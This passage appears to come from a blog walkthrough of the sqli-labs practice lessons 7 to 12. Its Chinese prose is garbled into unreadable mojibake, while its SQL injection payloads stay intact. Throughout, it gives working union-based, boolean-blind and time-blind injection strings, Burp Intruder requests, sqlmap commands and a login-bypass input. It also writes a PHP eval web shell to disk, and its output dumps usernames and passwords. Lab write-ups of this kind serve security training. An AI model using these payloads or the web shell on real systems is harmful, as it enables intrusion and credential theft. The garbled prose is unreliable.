ä¸æŠ¥é”™</p>\n<p>?id=1â€™)) order by 4 %23 + æŠ¥é”™</p>\n<p>é—­åˆæˆåŠŸï¼Œä¸”éœ€è¦ä¸‰ä¸ªå­—æ®µ</p>\n<p>payloadï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-7?id=1&#x27;)) union select &#x27;&lt;?php @eval($_POST[&quot;haha&quot;]); ?&gt;&#x27;,2,3 into outfile &#x27;D:/haha.php&#x27; %23+</span><br></pre></td></tr></table></figure>\n<p>è™½ç„¶è¾“å‡ºè¿˜æ˜¯æŠ¥é”™ï¼Œä½†æ˜¯æ–‡ä»¶å·²ç»ä¸Šä¼ åˆ° D ç›˜äº†ï¼ˆå› ä¸ºè¿™ä¸ª sql è¯­å¥æˆ‘å·²ç»åœ¨æ•°æ®åº“è¯•äº†å¾ˆå¤šéäº†â€¦ï¼‰</p>\n<p>ä½†æ˜¯å› ä¸ºæˆ‘çš„ mysql ä¸æ˜¯ PHPstudy çš„ï¼Œæ‰€ä»¥æ²¡æœ‰æåˆ° phpstudy çš„è·¯å¾„ï¼Œæ²¡æœ‰ä¸Šä¼ åˆ° phpstudy ç›®å½•ä¸‹ï¼Œä¹Ÿè¿æ¥ä¸ä¸Šè§£æä¸äº†ï¼Ÿ</p>\n<p>æœºæ™ºçš„æˆ‘å†³å®šæ‰‹åŠ¨å¤åˆ¶åˆ° www ä¸‹</p>\n<p>ä¸Šèšå‰‘è¿æ¥æˆåŠŸ</p>\n<p>å¦å¤–è¦çœ‹æ•°æ®åº“æ•°æ®çš„è¯å¯ä»¥é€šè¿‡æ”¹ä¸Šé¢çš„ p è¾“å‡ºæ–‡ä»¶ï¼Œç„¶åä¸Šèšå‰‘æŸ¥çœ‹è¾“å‡ºçš„æ–‡ä»¶å†…å®¹ï¼Œå…¶ä½™çš„çˆ†æ•°æ®åº“å’Œä¹‹å‰çš„é¢˜ç›®éƒ½ä¸€æ ·çš„æµç¨‹ï¼Œä¾‹å¦‚çˆ†å½“å‰æ•°æ®åº“åï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-7?id=1&#x27;)) union select database(),2,3 into outfile &#x27;D:/haha.php&#x27; %23+</span><br></pre></td></tr></table></figure>\n<p>å› ä¸ºç”¨å‘½ä»¤è¡Œç™»å½•æ•°æ®åº“éœ€è¦å¯†ç </p>\n<h3 id=\"æ€»ç»“-7\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-7\">#</a> æ€»ç»“</h3>\n<ol>\n<li>\n<p>MySQL çš„ @ä¸ @@åŒºåˆ«</p>\n<p>@x æ˜¯ ç”¨æˆ·è‡ªå®šä¹‰çš„å˜é‡ (User variables are written as @var_name)</p>\n<p>@@x æ˜¯ global æˆ– session å˜é‡ (@@global @@session)</p>\n</li>\n<li>\n<p>èœé¸¡çš„æ‚²å“€å°±æ˜¯åšä¸ªé¢˜è¿˜è¦é ä½œå¼Šï¼ˆèœèœå­ä¸è¦éš¾è¿‡ï¼ä½ ä¼šå˜å¼ºçš„ï¼ï¼‰</p>\n</li>\n</ol>\n<hr>\n<h1 id=\"less-8\"><a class=\"markdownIt-Anchor\" href=\"#less-8\">#</a> Less-8</h1>\n<p>date:2020-11-21 13:58:47</p>\n<h2 id=\"è¿‡ç¨‹-8\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-8\">#</a> è¿‡ç¨‹</h2>\n<h3 id=\"sqlmap-8\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-8\">#</a> sqlmap</h3>\n<p>åŒ less-1ï¼Œçœ‹è§ sqlmap çš„ payloadï¼Œå®ƒä¹Ÿæ˜¯ç›²æ³¨å’¯</p>\n<h3 id=\"æ‰‹å·¥æ³¨å…¥-8\"><a class=\"markdownIt-Anchor\" href=\"#æ‰‹å·¥æ³¨å…¥-8\">#</a> æ‰‹å·¥æ³¨å…¥</h3>\n<p>å•å¼•å·é—­åˆååˆ†åˆ« order by 3 å’Œ 4ï¼Œå‘ç°ä¸€ä¸ªæ­£å¸¸è¾“å‡ºä¸€ä¸ªä¸è¾“å‡ºï¼Œè¯´æ˜å•å¼•å·é—­åˆæˆåŠŸï¼Œorder by æ‰§è¡ŒæˆåŠŸï¼Œä¸”éœ€è¦ä¸‰ä¸ªå­—æ®µï¼Œpayloadï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-8?id=1&#x27; order by 3 %23+http://www.sqli-labs.com/Less-8?id=1&#x27; order by 4 %23+</span><br></pre></td></tr></table></figure>\n<p>æ²¡æœ‰å›æ˜¾æ•°æ®ï¼Œåªèƒ½ç›²æ³¨</p>\n<p>å°è¯•ç¬¬ä¸ƒå…³çš„ outfile ä¸Šä¼ æ–‡ä»¶ï¼Œä¸Šä¼ æˆåŠŸï¼Œä¸Šèšå‰‘è¿æ¥</p>\n<p>æ¢ä¸ªæ€è·¯ï¼Œä¸Šç›²æ³¨ï¼Œçœ‹é¢˜ç›®æ˜¯å¸ƒå°”ç›²æ³¨ï¼Œä¸€ä¸ªä¸€ä¸ªçŒœå‘—ï¼Œæœºæ™ºçš„æˆ‘å†³å®šå…ˆæµ‹è¯•å‡ºé•¿åº¦å†ä¸Š bp çˆ†</p>\n<p>length () å‡½æ•°ï¼Œæ˜¾è€Œæ˜“è§æ˜¯è¿”å›é‡Œé¢å‚æ•°çš„é•¿åº¦</p>\n<p>substr (a,b,c) å‡½æ•°ï¼Œæ˜¾è€Œæ˜“è§æ˜¯æˆªæ–­å­—ç¬¦ä¸² aï¼Œb ä½ç½®å¼€å§‹æˆªå– c ä¸ªå­—ç¬¦</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-8?id=1&#x27; and (select length(database()))=8 %23+</span><br></pre></td></tr></table></figure>\n<p>=8 æ—¶æ­£å¸¸è¾“å‡ºï¼Œè¯´æ˜å½“å‰æ•°æ®åº“åå­—é•¿åº¦ä¸º 8</p>\n<p>ä¸Š bp, é€‰ä¸­ Intruder</p>\n<p>æ”»å‡»æ¨¡å¼å¯ä»¥é€‰ sniper ä¹Ÿå¯ä»¥é€‰ clusterbombï¼Œéƒ½å¾ˆæ–¹ä¾¿ï¼Œå­—å…¸ç›´æ¥ç”¨ excel ä¸‹æ‹‰åˆ° 127 çš„â€¦ï¼Œä¸€ä¸ªä¸€ä¸ªæ‰“ä¹Ÿå¤ªè´¹åŠ²äº†æŠŠ</p>\n<p>ä» 1 åˆ° 127 ä¸€ä¸ªä¸€ä¸ªçŒœæ•°æ®åº“åä¸­çš„å­—ç¬¦ï¼Œæ ¹æ®è¿”å›æ•°æ®çš„é•¿åº¦ä¸åŒæ‰¾åˆ°æ­£ç¡®çš„ ascii ç å€¼ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /Less-8/?id=1%27%20and%20(select%20ascii(substr(database(),Â§1Â§,1)))=Â§115Â§%20%23+ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateDNT: 1Connection: keep-aliveUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cache</span><br></pre></td></tr></table></figure>\n<p>è¿™é‡Œå°±ä¸ä¸Š bp å›¾äº†ï¼Œä¸å¥½æï¼Œç”¨çš„ç¬›å¡å°”ä¹˜ç§¯ï¼Œå‘äº†ä¸€åƒå¤šä¸ªè¯·æ±‚å°±çˆ†äº†ä¸ªå½“å‰æ•°æ®åº“åï¼Œè¦çˆ†åˆ«çš„åœ¨ä¸Šé¢ payload æ”¹æ”¹å®Œäº‹ï¼š</p>\n<table>\n<thead>\n<tr>\n<th>request</th>\n<th>payload1</th>\n<th>payload2</th>\n<th>status</th>\n<th>timeout</th>\n<th>error</th>\n<th>length</th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0</td>\n<td></td>\n<td></td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>787</td>\n<td>3</td>\n<td>99</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>802</td>\n<td>2</td>\n<td>101</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>838</td>\n<td>6</td>\n<td>105</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>909</td>\n<td>5</td>\n<td>114</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>913</td>\n<td>1</td>\n<td>115</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>927</td>\n<td>7</td>\n<td>116</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>932</td>\n<td>4</td>\n<td>117</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>968</td>\n<td>8</td>\n<td>121</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>966</td>\n<td></td>\n</tr>\n<tr>\n<td>2</td>\n<td>2</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>966</td>\n<td></td>\n</tr>\n<tr>\n<td>3</td>\n<td>3</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>966</td>\n<td></td>\n</tr>\n<tr>\n<td>4</td>\n<td>4</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>966</td>\n<td></td>\n</tr>\n<tr>\n<td>5</td>\n<td>5</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>966</td>\n<td></td>\n</tr>\n<tr>\n<td>6</td>\n<td>6</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>966</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"æ€»ç»“-8\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-8\">#</a> æ€»ç»“</h2>\n<p>ç›²æ³¨ä¸€ä¸ªä¸ªæ‰‹æ‰“çš„è¯å°±æ˜¯å¾ˆè´¹æ—¶é—´ï¼Œç–²æƒ«</p>\n<p>æœ‰ sqlmap çœŸå¥½</p>\n<hr>\n<h1 id=\"less-9\"><a class=\"markdownIt-Anchor\" href=\"#less-9\">#</a> Less-9</h1>\n<p>dateï¼š2020-11-21 15:10:01</p>\n<h2 id=\"è¿‡ç¨‹-9\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-9\">#</a> è¿‡ç¨‹</h2>\n<h3 id=\"sqlmap-9\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-9\">#</a> sqlmap</h3>\n<p>åŒ less-1</p>\n<h3 id=\"æ‰‹å·¥æ³¨å…¥-9\"><a class=\"markdownIt-Anchor\" href=\"#æ‰‹å·¥æ³¨å…¥-9\">#</a> æ‰‹å·¥æ³¨å…¥</h3>\n<p>ä¸ç®¡è¾“å…¥ä»€ä¹ˆéƒ½æ˜¯æ­£å¸¸è¾“å‡ºï¼Œæ˜æ˜è¾“å…¥çš„ id æ•°æ®åº“é‡Œé¢å°±æ²¡æœ‰ï¼Œè¿˜è¯´ you are inï¼Œç”¨æˆ·ä½“éªŒå·®è¯„ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Welcome    DhakkanYou are in...........</span><br></pre></td></tr></table></figure>\n<p>åˆ©ç”¨ if () å‡½æ•°è¿›è¡Œæ—¶é—´ç›²æ³¨ï¼Œå‘ç°é—­åˆå•å¼•å·çš„æ—¶å€™å®ƒå°±ä¸€ç›´ç¡è§‰å’¯</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-9?id=1&#x27; and if((1=2),1,sleep(2333)) %23</span><br></pre></td></tr></table></figure>\n<p>å’Œå¸ƒå°”ç›²æ³¨ç±»ä¼¼ï¼Œä½†æ˜¯æ˜¯æ ¹æ®æœåŠ¡å™¨å“åº”çš„æ—¶é—´é•¿çŸ­è¿›è¡Œåˆ¤æ–­äº†ï¼Œå¼€å¹²</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-9?id=1&#x27; and if((length(database())=8),sleep(2333),1) %23</span><br></pre></td></tr></table></figure>\n<p>åˆ¤æ–­å‡º database () çš„é•¿åº¦æ˜¯ 8 ä¸ªå­—ç¬¦ï¼Œè¿˜æ˜¯æ¥ç€ä¸Š bpï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /Less-9/?id=1%27%20and%20if((ascii(substr(database(),Â§1Â§,1))=Â§115Â§),sleep(11),1)%20%23 HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateDNT: 1Connection: keep-aliveUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cache</span><br></pre></td></tr></table></figure>\n<p>bp çš„ resultï¼Œæ ¹æ® ascii å€¼å°±å¯ä»¥å§å½“å‰æ•°æ®åå¼„å‡ºæ¥äº†ï¼š</p>\n<table>\n<thead>\n<tr>\n<th>request</th>\n<th>payload1</th>\n<th>payload2</th>\n<th>status</th>\n<th>timeout</th>\n<th>error</th>\n<th>length</th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0</td>\n<td></td>\n<td></td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>787</td>\n<td>3</td>\n<td>99</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>802</td>\n<td>2</td>\n<td>101</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>838</td>\n<td>6</td>\n<td>105</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>909</td>\n<td>5</td>\n<td>114</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>913</td>\n<td>1</td>\n<td>115</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>927</td>\n<td>7</td>\n<td>116</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>932</td>\n<td>4</td>\n<td>117</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>968</td>\n<td>8</td>\n<td>121</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>988</td>\n<td></td>\n</tr>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>951</td>\n<td></td>\n</tr>\n<tr>\n<td>2</td>\n<td>2</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>951</td>\n<td></td>\n</tr>\n<tr>\n<td>3</td>\n<td>3</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>951</td>\n<td></td>\n</tr>\n<tr>\n<td>4</td>\n<td>4</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>951</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"æ€»ç»“-9\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-9\">#</a> æ€»ç»“</h2>\n<p>å…¶å®æƒ³èŠ‚çœæ—¶é—´å¯ä»¥å»çœ‹æ•°æ®åº“çš„å‘½åè§„èŒƒï¼Œç¡®å®šè¦æµ‹è¯•çš„å­—ç¬¦æœ‰å“ªäº›ï¼Œè¿™æ ·åœ¨è¿›è¡Œå¤§é‡æ•°æ®æµ‹è¯•çš„æ—¶å€™ä¼šèŠ‚çœä¸€äº›æ—¶é—´</p>\n<hr>\n<h1 id=\"less-10\"><a class=\"markdownIt-Anchor\" href=\"#less-10\">#</a> Less-10</h1>\n<p>dateï¼š2020-11-21 15:55:10</p>\n<h2 id=\"è¿‡ç¨‹-10\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-10\">#</a> è¿‡ç¨‹</h2>\n<h3 id=\"sqlmap-10\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-10\">#</a> sqlmap</h3>\n<p>åŒ less-1</p>\n<h3 id=\"æ‰‹å·¥æ³¨å…¥-10\"><a class=\"markdownIt-Anchor\" href=\"#æ‰‹å·¥æ³¨å…¥-10\">#</a> æ‰‹å·¥æ³¨å…¥</h3>\n<p>å’Œ less-9 ç›¸æ¯”å°±æ˜¯å•å¼•å·é—­åˆå˜æˆäº†åŒå¼•å·é—­åˆ</p>\n<p>ç”¨è¿™ä¸ª payloadï¼ŒæœåŠ¡å™¨å°±ç¡è§‰å•¦ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-10?id=1&quot; and if((1=1),sleep(2333),1) %23+</span><br></pre></td></tr></table></figure>\n<p>åé¢çš„æµç¨‹å’Œ less-9 ä¸€æ ·</p>\n<h2 id=\"æ€»ç»“-10\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-10\">#</a> æ€»ç»“</h2>\n<p>é‡åˆ°è¿™ä¸ªé¢˜ç›®ä¹Ÿä¸çŸ¥é“æ˜¯è¯¥å¼€å¿ƒè¿˜æ˜¯è¯¥å¼€å¿ƒ</p>\n<hr>\n<h1 id=\"less-11\"><a class=\"markdownIt-Anchor\" href=\"#less-11\">#</a> Less-11</h1>\n<p>dateï¼š2020-11-21 16:23:25</p>\n<h2 id=\"è¿‡ç¨‹-11\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-11\">#</a> è¿‡ç¨‹</h2>\n<p>å†™å®Œæ—¶é—´ç›²æ³¨çš„æˆ‘ï¼Œçœ‹è§è¿™é“é¢˜ç›®ï¼Œçœ¼å‰ä¸€äº®ï¼ç»ˆäºæ¢é¢˜ç›®å•¦å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå—</p>\n<h3 id=\"sqlmap-11\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-11\">#</a> sqlmap</h3>\n<p>sqlmap æµ‹ post è¯·æ±‚å¯ä»¥ç”¨å‚æ•° forms</p>\n<p>è¿™é‡Œç”¨çš„â€“forms å‚æ•°ï¼Œç›´æ¥æåˆ°æ‰€æœ‰æ•°æ®åº“äº†ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">py sqlmap.py -u http://www.sqli-labs.com/Less-11 --forms --dbs --batch</span><br></pre></td></tr></table></figure>\n<p>åé¢çˆ†å­—æ®µå€¼æ”¹å‚æ•°å°±å¯ä»¥äº†ï¼ŒåŒ less-1</p>\n<h3 id=\"æ‰‹å·¥æ³¨å…¥-11\"><a class=\"markdownIt-Anchor\" href=\"#æ‰‹å·¥æ³¨å…¥-11\">#</a> æ‰‹å·¥æ³¨å…¥</h3>\n<p>çœ‹è§ç™»å½•æ¡†å°±æƒ³ admin/123456 ç™»å½•ï¼ˆç«Ÿç„¶å¤±è´¥äº†ï¼æ°”äººï¼ï¼‰</p>\n<p>æŠ“åŒ…çœ‹è§çš„æ˜¯ post è¯·æ±‚ï¼Œæ‰€ä»¥ä¸èƒ½å’Œä¹‹å‰ä¸€æ ·ç›´æ¥åœ¨ url åé¢æ¥å‚æ•°äº†ï¼Œé‚£å°±åœ¨è¾“å…¥æ¡†ç›´æ¥æ³¨å…¥å“ˆå“ˆå“ˆ</p>\n<p>payloadï¼Œusername æœ€åé¢æœ‰ä¸ªç©ºæ ¼ï¼Œä¸åŠ ç©ºæ ¼æ³¨é‡Šç¬¦å·å’Œåé¢çš„ç¬¦å·è¿æ¥åœ¨ä¸€èµ·ï¼Œå°±èµ·ä¸åˆ°æ³¨é‡Šçš„åŠŸèƒ½å•¦:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Username :    admin&#x27; or 1=1 -- Password :    123456</span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Your Login name:DumbYour Password:Dumb</span><br></pre></td></tr></table></figure>\n<p>æœ‰æ•°æ®å›æ˜¾ï¼Œèˆ’æœäº†</p>\n<p>ä¸Š bp æŠ“åŒ…ï¼Œç›´æ¥æ”¹åé¢çš„å‚æ•°ï¼Œæ ¹æ® order by ç¡®å®šéœ€è¦ä¸¤ä¸ªå­—æ®µï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /Less-11/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-11/Content-Type: application/x-www-form-urlencodedContent-Length: 51Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin%27 order by 2+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºï¼Œç«Ÿç„¶çœŸçš„æœ‰ä¸€ä¸ª admin/adminâ€¦ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your Login name:admin&lt;br&gt;Your Password:admin&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>çˆ†æ•°æ®åº“ payloadï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=zhatian%27 union select 1,group_concat(schema_name) from information_schema.schemata+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your Login name:1&lt;br&gt;Your Password:information_schema,bookstore,challenges,dvwa,edusys,exam,fresh,hotel,hy,hy2,mysql,news,pentest,performance_schema,pikachu,security,store,student,test,vote&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>çˆ†è¡¨ payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=zhatian%27 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your Login name:1&lt;br&gt;Your Password:emails,referers,uagents,users&lt;br</span><br></pre></td></tr></table></figure>\n<p>çˆ†å­—æ®µ:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=zhatian%27 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;+--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your Login name:1&lt;br&gt;Your Password:user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,level,id,username,password&lt;br&gt;</span><br></pre></td></tr></table></figure>\n<p>çˆ†å­—æ®µå€¼:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=zhatian%27 union select 1,group_concat(concat_ws(&#x27;--&#x27;,username,password)) from users +--+&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;br&gt;Your Login name:1&lt;br&gt;Your Password:Dumb--Dumb,Angelina--I-kill-you,Dummy--p@ssword,secure--crappy,stupid--stupidity,superman--genious,batman--mob!le,admin--admin,admin1--admin1,admin2--admin2,admin3--admin3,dhakkan--dumbo,admin4--admin4&lt;br</span><br></pre></td></tr></table></figure>\n<p>åé¢çš„éƒ½æ˜¯å¸¸è§„æ“ä½œäº†</p>\n<h2 id=\"æ€»ç»“-11\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-11\">#</a> æ€»ç»“</h2>\n<p>sqlmap æµ‹ post è¯·æ±‚å¯ä»¥ç”¨å‚æ•° formsï¼Œç›´æ¥è·å–è¡¨å•ï¼Œå¯ä»¥ä½¿ç”¨ - r å‚æ•°è¯»å–è¯·æ±‚æ–‡ä»¶ï¼Œæˆ–è€…é€šè¿‡â€“data å‚æ•°æµ‹è¯•ï¼Œå…·ä½“æƒ…å†µå…·ä½“ç™¾åº¦</p>\n<p>-r è¯»å–çš„æ–‡ä»¶å¯ä»¥ç”¨ bp æŠ“åŒ…ï¼Œå³é”® copy to fileï¼Œç›´æ¥å¯¼å‡º txt æ–‡ä»¶</p>\n<hr>\n<h1 id=\"less-12\"><a class=\"markdownIt-Anchor\" href=\"#less-12\">#</a> Less-12</h1>\n<h2 id=\"è¿‡ç¨‹-12\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-12\">#</a> è¿‡ç¨‹</h2>\n<p>dateï¼š2020-11-21 17:21:22</p>\n<h3 id=\"sqlmap-12\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-12\">#</a> sqlmap</h3>\n<p>åŒ less-11</p>\n<h3 id=\"æ‰‹å·¥æ³¨å…¥-12\"><a class=\"markdownIt-Anchor\" href=\"#æ‰‹å·¥æ³¨å…¥-12\">#</a> æ‰‹å·¥æ³¨å…¥</h3>\n<p>ä¸Š bp æŠ“åŒ…</p>\n<p>å‘ç°åŒå¼•å·æŠ¥é”™ï¼Œpayloadï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uname=admin&quot;+or+1%3D1+--+&amp;passwd=1234&amp;submit=Submit</span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">You have an error in your SQL syntax; check the manual 